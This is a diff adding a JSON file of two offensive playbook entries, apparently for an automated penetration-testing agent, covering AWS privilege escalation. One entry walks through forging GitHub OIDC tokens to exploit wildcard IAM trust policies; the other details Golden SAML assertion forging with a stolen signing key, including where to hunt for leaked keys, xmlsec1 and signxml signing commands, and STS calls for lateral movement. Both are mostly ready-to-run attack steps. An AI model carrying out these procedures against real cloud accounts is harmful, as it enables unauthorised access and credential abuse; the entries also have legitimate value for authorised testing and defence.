@@ -1,0 +1,47 @@
+[
+  {
+    "id": "cloud-oidc-claim-forge",
+    "category": "EXPLOIT",
+    "subcategory": "AWS",
+    "title": "AWS OIDC Federation Claim Mismatch — Cross-Repo AssumeRoleWithWebIdentity",
+    "description": "AWS IAM OIDC identity providers use trust policies with StringLike/StringEquals conditions on JWT claims (sub, aud). When the trust policy uses wildcards in claim conditions (e.g., token.actions.githubusercontent.com:sub with repo:demo-org/*), the condition matches tokens from unauthorized repositories. Attack: (1) Discover OIDC provider ARN: aws iam list-open-id-connect-providers. (2) List roles using the provider: aws iam list-roles — check trust policies of each role with aws iam get-role --role-name ROLE. (3) Identify StringLike conditions with wildcards (repo:* or repo:ANY_ORG/*). (4) Forge JWT with matching claims using jwt_forge: sub=repo:ANY_ORG/ANY_REPO:ref:refs/heads/main, aud=sts.amazonaws.com. (5) Call STS: aws sts assume-role-with-web-identity --role-arn ROLE_ARN --role-session-name test --web-identity-token \"$JWT\". (6) Use returned temporary credentials (AccessKeyId, SecretAccessKey, SessionToken) for lateral movement to AWS services.",
+    "techniques": [
+      "List OIDC providers: aws iam list-open-id-connect-providers",
+      "Get role trust policy: aws iam get-role --role-name ROLE --query 'Role.AssumeRolePolicyDocument'",
+      "Identify wildcard conditions: StringLike with repo:* or sub=*",
+      "Forge JWT: jwt_forge with sub=repo:ANY/ANY:ref:refs/heads/main, aud=sts.amazonaws.com",
+      "Assume role: aws sts assume-role-with-web-identity --role-arn ROLE_ARN --role-session-name attacker --web-identity-token TOKEN",
+      "Verify access: aws sts get-caller-identity",
+      "List S3: aws s3 ls"
+    ],
+    "indicators": ["IAM OIDC identity provider exists", "Trust policy with StringLike condition on sub or aud claim", "Wildcard in sub condition allowing cross-repo/cross-org access", "jwt_forge can create tokens with arbitrary sub claims"],
+    "prerequisites": ["AWS CLI with IAM read permissions (iam:ListRoles, iam:GetRole)", "Knowledge of OIDC provider audience and thumbprint", "JWT forging capability (jwt_forge)"],
+    "tools": ["aws_cli", "jwt_forge"],
+    "tags": ["aws", "oidc", "federation", "iam", "jwt", "assume-role-with-web-identity", "sts", "cross-repo", "stringlike"],
+    "confidence": 0.85,
+    "mitre_attack": "T1550"
+  },
+  {
+    "id": "cloud-golden-saml",
+    "category": "EXPLOIT",
+    "subcategory": "AWS",
+    "title": "Golden SAML — SAML Assertion Forging with Compromised Token-Signing Key",
+    "description": "When the SAML identity provider's token-signing private key is compromised, an attacker can forge SAML 2.0 assertions to assume any IAM role. Attack: (1) Obtain the SAML token-signing private key (typically a PEM file leaked via .git/config, metadata service, or environment variable). (2) Construct a SAML 2.0 assertion XML document with: Issuer (IdP entity ID), Subject/NameID, Conditions (NotBefore/NotOnOrAfter timestamps), AttributeStatement containing AWS role attributes (https://aws.amazon.com/SAML/Attributes/Role with ROLE_ARN,PROVIDER_ARN and https://aws.amazon.com/SAML/Attributes/RoleSessionName). (3) Sign the assertion using XMLDSig (xmlsec1 CLI or Python signxml library) with the compromised private key. (4) Base64-encode the signed assertion. (5) Call STS: aws sts assume-role-with-saml --role-arn ROLE_ARN --principal-arn PROVIDER_ARN --saml-assertion \"$BASE64_ASSERTION\". (6) Use returned temporary credentials. (7) For Python-based signing: pip install signxml, then use signxml.XMLSigner with the private key and X.509 certificate.",
+    "techniques": [
+      "Obtain signing key: look for .pem files, env vars (SAML_SIGNING_KEY, PRIVATE_KEY), or metadata endpoints",
+      "Construct SAML XML with proper namespaces (urn:oasis:names:tc:SAML:2.0:assertion)",
+      "Include AWS role attributes: AttributeStatement with Role and RoleSessionName",
+      "Sign with xmlsec1: xmlsec1 --sign --privkey-pem key.pem --output signed.xml assertion.xml",
+      "Sign with Python: from signxml import XMLSigner; signer = XMLSigner().sign(assertion_xml, key=private_key, cert=cert)",
+      "Base64-encode: base64 -w0 signed.xml",
+      "Assume role: aws sts assume-role-with-saml --role-arn ROLE_ARN --principal-arn PROVIDER_ARN --saml-assertion \"$B64\"",
+      "Verify: aws sts get-caller-identity"
+    ],
+    "indicators": ["SAML federation configured (iam:ListSAMLProviders)", "Private key leakage (PEM in source code, metadata, or env vars)", "AWS STS AssumeRoleWithSAML endpoint accessible", "Python signxml or system xmlsec1 available"],
+    "prerequisites": ["SAML IdP token-signing private key (PEM format)", "SAML provider ARN and role ARN", "IAM role trust policy allowing SAML federation (saml:aud condition)", "xmlsec1 CLI or Python signxml package"],
+    "tools": ["aws_cli", "shell_exec"],
+    "tags": ["aws", "saml", "federation", "golden-saml", "forgery", "sts", "assume-role-with-saml", "xml-signature"],
+    "confidence": 0.80,
+    "mitre_attack": "T1606.002"
+  }
+]
